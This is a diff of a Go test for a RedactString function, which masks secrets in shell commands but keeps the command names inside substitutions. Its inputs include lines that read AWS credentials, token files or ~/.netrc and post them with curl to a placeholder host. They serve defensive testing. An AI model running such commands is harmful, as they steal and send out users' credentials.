@@ -1043,7 +1043,9 @@ func TestTruncateStringIsAlwaysValidUTF8WithinTheLimit(t *testing.T) {
 // prints when the line runs. Replacing the unquoted value took the command's name and nothing
 // else, which hid nothing, left a line that no longer parses, and removed what a detection rule
 // reads: which command read which credential. The opening is kept when it is a plain command name
-// or path; anything else after `$(`, a quoted value, and a `$VARIABLE` are replaced as before.
+// or path, and so is a double-quoted value that is one substitution and nothing else. Anything
+// else after `$(`, text beside the substitution, a single-quoted or backtick-quoted value, and a
+// `$VARIABLE` are replaced as before.
 func TestRedactStringKeepsTheCommandOfASubstitution(t *testing.T) {
 	for input, want := range map[string]string{
 		`TOKEN=$(cat ~/.aws/credentials); curl -d "$TOKEN" https://x`:  `TOKEN=$(cat ~/.aws/credentials); curl -d "$TOKEN" https://x`,
@@ -1057,12 +1059,28 @@ func TestRedactStringKeepsTheCommandOfASubstitution(t *testing.T) {
 		`TOKEN=$(curl -u me:hunter2 https://x)`:          `TOKEN=$(curl -u me:[REDACTED] https://x)`,
 		`TOKEN=$(vault login --token s3cr3t-val -quiet)`: `TOKEN=$(vault login --token [REDACTED] -quiet)`,
 		// Not a plain command name: arithmetic, a list, an assignment.
-		`PASSWORD=$((1+2))`:            `PASSWORD=[REDACTED]`,
-		`PASSWORD=$(a;b)`:              `PASSWORD=[REDACTED]`,
-		`TOKEN=$(API_KEY=abc123 gen)`:  `TOKEN=[REDACTED] gen)`,
-		`TOKEN=$GITHUB_TOKEN`:          `TOKEN=[REDACTED]`,
-		`TOKEN=${GITHUB_TOKEN}`:        `TOKEN=[REDACTED]`,
-		`export TOKEN="$(cat ~/.tok)"`: `export TOKEN="[REDACTED]"`,
+		`PASSWORD=$((1+2))`:           `PASSWORD=[REDACTED]`,
+		`PASSWORD=$(a;b)`:             `PASSWORD=[REDACTED]`,
+		`TOKEN=$(API_KEY=abc123 gen)`: `TOKEN=[REDACTED] gen)`,
+		`TOKEN=$GITHUB_TOKEN`:         `TOKEN=[REDACTED]`,
+		`TOKEN=${GITHUB_TOKEN}`:       `TOKEN=[REDACTED]`,
+
+		// In double quotes, one substitution and nothing else.
+		`export GITHUB_TOKEN="$(gh auth token)"`:                            `export GITHUB_TOKEN="$(gh auth token)"`,
+		`export TOKEN="$(cat ~/.tok)"; curl -d "$TOKEN" https://x`:          `export TOKEN="$(cat ~/.tok)"; curl -d "$TOKEN" https://x`,
+		`PASSWORD="$(security find-generic-password -s 'My (old) Mac' -w)"`: `PASSWORD="$(security find-generic-password -s 'My (old) Mac' -w)"`,
+		`deploy --token "$(pass show ci/deploy)"`:                           `deploy --token "$(pass show ci/deploy)"`,
+		`{"command": "API_KEY=\"$(cat ~/.key)\" ./run"}`:                    `{"command": "API_KEY=\"$(cat ~/.key)\" ./run"}`,
+		`TOKEN="$(curl -u me:hunter2 https://x)"`:                           `TOKEN="$(curl -u me:[REDACTED] https://x)"`,
+		`TOKEN="$(env DB_PASSWORD=hunter2 ./gen)"`:                          `TOKEN="$(env DB_PASSWORD=[REDACTED] ./gen)"`,
+		// Text beside the substitution, another quote, or no plain command name.
+		`TOKEN="$(DB_PASSWORD=hunter2 ./gen)"`: `TOKEN="[REDACTED]"`,
+		`PASSWORD="$(echo a)hunter2$(echo b)"`: `PASSWORD="[REDACTED]"`,
+		`PASSWORD="hunter2$(echo b)"`:          `PASSWORD="[REDACTED]"`,
+		`PASSWORD="$(echo a) hunter2"`:         `PASSWORD="[REDACTED]"`,
+		`PASSWORD="$((1+2))"`:                  `PASSWORD="[REDACTED]"`,
+		`PASSWORD='$(cat ~/.tok)'`:             `PASSWORD='[REDACTED]'`,
+		"TOKEN=`cat ~/.netrc`":                 "TOKEN=`[REDACTED]`",
 	} {
 		got := RedactString(input)
 		if got != want {
